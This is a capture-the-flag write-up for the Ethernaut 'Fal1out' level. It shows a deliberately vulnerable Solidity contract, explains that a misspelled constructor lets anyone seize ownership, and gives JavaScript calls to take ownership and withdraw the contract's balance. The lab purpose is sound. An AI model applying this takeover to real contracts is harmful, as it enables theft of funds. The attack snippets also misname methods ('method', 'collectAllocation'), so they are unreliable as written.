# Ethernaut Fal1out Level Attack

## Goal

Claim ownership of the contract below to complete this level.

---

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}

```

## Root cause

```solidity

function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}

```

In solidity, a real constructor must use the "constructor" key word. This style of naming was deprecated. Fal1out() is not a constructor, it is a public function as it was misspelled "fal1out" instead of "fallout", so anyone can call this function after deployment and become the owner of the contract. Then can call function collectAllocation() to withdraw the contract balance because "onlyOwner" already passed.

## Attack plan

Step 1: Call Fal1out() after deployment and become the owner
```javascript
await contract.method.Fal1out().send({ from: player, value: 0 });
```

Step 2: Verify ownership
```javascript
await contract.method.owner().call()
```

Step 3: Withdraw the contract balance (optional)
```javascript
await contract.method.collectAllocation().send({ from: player });
```